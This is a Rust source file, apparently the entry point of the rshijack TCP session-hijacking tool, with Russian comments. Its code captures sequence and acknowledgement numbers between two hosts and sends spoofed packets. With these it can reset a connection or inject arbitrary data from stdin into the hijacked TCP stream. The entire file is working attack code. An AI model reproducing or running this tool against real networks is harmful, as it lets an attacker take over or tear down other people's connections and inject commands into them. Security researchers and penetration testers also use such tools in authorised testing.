use env_logger::Env;
use rshijack::args::Args;
use rshijack::errors::*;
use rshijack::net::{self, TcpFlags};
use std::io::{self, Read};
use std::thread;
use structopt::StructOpt;

fn main() -> Result<()> {
    // Парсим параметры приложения
    let args = Args::from_args();

    // Режим логирования в зависимости от параметров
    let log_level = if args.quiet == 0 {
        "rshijack=debug"
    } else {
        "warn"
    };

    // Стартуем систему логирования из настроек окружения, либо по параметрам
    env_logger::init_from_env(Env::default().default_filter_or(log_level));

    // Смотрим аргументы
    trace!("arguments: {:?}", args);

    // Ждем события SEQ/ACK которые прилетят из srcip в dstip
    // Для ускорения нужно попробовать инициализировать соединение между ними
    eprintln!("Waiting for SEQ/ACK to arrive from the srcip to the dstip.");
    eprintln!("(To speed things up, try making some traffic between the two, /msg person asdf)");

    // Есть ли в параметрах у нас начальные значения ack/seq
    // Но очень сильно врятли, что мы найдем нужное значение
    let mut connection = if let (Some(seq), Some(ack)) = (args.seq, args.ack) {
        eprintln!("[+] Using SEQ = 0x{:x}, ACK = 0x{:x}", seq, ack);
        net::Connection::new(args.src, args.dst, seq, ack)
    } else {
        let c = net::getseqack(&args.interface, &args.src, &args.dst)?;
        eprintln!(
            "[+] Got packet! SEQ = 0x{:x}, ACK = 0x{:x}",
            c.get_seq(),
            c.get_ack()
        );
        c
    };

    // Создаем TCP сокет
    let (mut tx, _rx) = net::create_socket()?;

    // Надо ли сбрасывать соединение
    if args.reset {
        connection.reset(&mut tx)?;
        eprintln!("[+] Connection has been reset");
        return Ok(());
    }

    {
        // Создаем копию соединения и интерфейса
        let mut connection = connection.clone();
        let interface = args.interface.clone();

        // Адреса отправителя и получателя меняем местами
        let dst = connection.src;
        let src = connection.dst;

        // Создаем отправителя и получателя
        let (mut tx, _rx) = net::create_socket()?;

        // В отдельном потоке запускаем обратную оправку пакетом от получателя к отправителю
        let _recv = thread::spawn(move || {
            net::recv(&mut tx, &interface, &mut connection, &src, &dst).unwrap();
        });
    }

    // Надо ли отправить 1кб пустых данных
    if args.send_null {
        info!("Sending 1kb of null bytes to prevent desync");

        let data = vec![0; 1024];
        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data)?;
    }

    eprintln!("Starting hijack session, Please use ^D to terminate.");
    eprintln!("Anything you enter from now on is sent to the hijacked TCP connection.");

    // Отправляем данные из stdin в соединение
    let mut stdin = io::stdin();
    let mut data = vec![0; 512];
    loop {
        let len = stdin.read(&mut data)?;

        if len == 0 {
            break;
        }

        connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::PSH, &data[..len])?;
    }

    // Завершаем соединение
    connection.sendtcp(&mut tx, TcpFlags::ACK | TcpFlags::FIN, &[])?;
    eprintln!("Exiting..");

    Ok(())
}
